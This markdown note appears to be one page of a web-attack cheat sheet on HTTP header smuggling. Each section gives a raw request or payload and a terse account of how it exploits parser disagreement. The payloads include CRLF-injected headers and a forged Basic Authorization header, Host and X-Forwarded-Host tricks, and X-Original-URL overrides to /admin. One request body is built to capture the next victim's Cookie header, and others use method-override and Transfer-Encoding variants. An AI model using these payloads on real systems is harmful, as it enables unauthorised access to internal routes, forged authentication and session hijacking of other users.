# Header smuggling — the header-level disagreements

## The header-name fold — `X-Injected:` inside a value

```text
GET /?host=x%0d%0aX-Injected:%201
```

`%0d%0a` inside a value lands the `X-Injected:` header — the value-fold
— `crlf-injection.md`.

## The header-continuation — `value\r\n folded`

```text
GET /?host=x%0d%0a%20X-Inj:%201
```

The `%20` leading-space makes the next line a CONTINUATION — obs-fold —
the `X-Inj: 1` is inside the previous header's value, not a new header —
an RFC-strict parser rejects obs-fold, a lenient parser joins.

## The duplicate-Host — `Host: a` + `Host: b`

```text
GET / HTTP/1.1
Host: a
Host: b
```

Two `Host:` headers — RFC says reject — implementations differ:
first-wins, last-wins, join — a vhost-smuggle — `internal-routes.md`.

## The absolute-URI — `GET http://internal/path`

```text
GET http://internal/path HTTP/1.1
Host: t
```

The absolute-URI form — a proxy routes on the URI host, not the `Host:`
header — a URI-vs-Host desync.

## The `X-Forwarded-Host` — the routing header

```text
GET / HTTP/1.1
Host: t
X-Forwarded-Host: internal
```

`X-Forwarded-Host` overrides the `Host:` for routing — a front-end
that forwards it → the back-end routes to `internal`.

## The `X-Original-URL` / `X-Rewrite-URL` — the path-override

```text
GET / HTTP/1.1
X-Original-URL: /admin
```

`X-Original-URL`/`X-Rewrite-URL` — IIS/ASP.NET honors them as the path —
a front-end that forwards → the back-end routes to `/admin` — the
path-override.

## The `Referer`-based routing — `Referer: http://t/admin`

```text
GET / HTTP/1.1
Referer: http://t/admin
```

An app that routes on `Referer` — the internal path — a Referer-smuggle.

## The `Cookie:` smuggle — the victim's cookie inside yours

```text
POST /store HTTP/1.1
Content-Length: 400

x=
```

The next victim's `Cookie:` lands inside your `x=` — `session-hijack.md`.

## The `Authorization` fold — `value\r\nAuthorization: Basic ...`

```text
GET /?host=x%0d%0aAuthorization:%20Basic%20YWRtaW46YWRtaW4=
```

The fold injects `Authorization` — the outbound request carries the
forged auth — `crlf-injection.md`.

## The `Via` smuggle — `Via: 1.1 proxy` chain

```text
Via: 1.1 internal-proxy
```

The `Via` chain — a proxy that appends it vs one that overwrites —
the chain-info smuggle.

## The `Forwarded:` header — the RFC 7239 form

```text
Forwarded: for=127.0.0.1;host=internal;proto=https
```

The RFC `Forwarded:` header — the structured form of X-Forwarded-* —
a parser that honors it vs one that doesn't.

## The `X-HTTP-Method-Override` — the method-smuggle

```text
POST / HTTP/1.1
X-HTTP-Method-Override: PUT
```

The method-override — a front-end that forwards it → the back-end
treats POST as PUT — a method-smuggle.

## The `Content-Type` smuggle — the body-parser mismatch

```text
Content-Type: application/json
```

vs `application/x-www-form-urlencoded` — the body-parser the back-end
uses determines what the body means — a parser-mismatch.

## The `Transfer-Encoding` synonyms — `TE:`, `Transfer_Encoding:`

```text
TE: chunked
Transfer_Encoding: chunked
```

Non-standard header names some parsers honor — `obfuscation.md`.
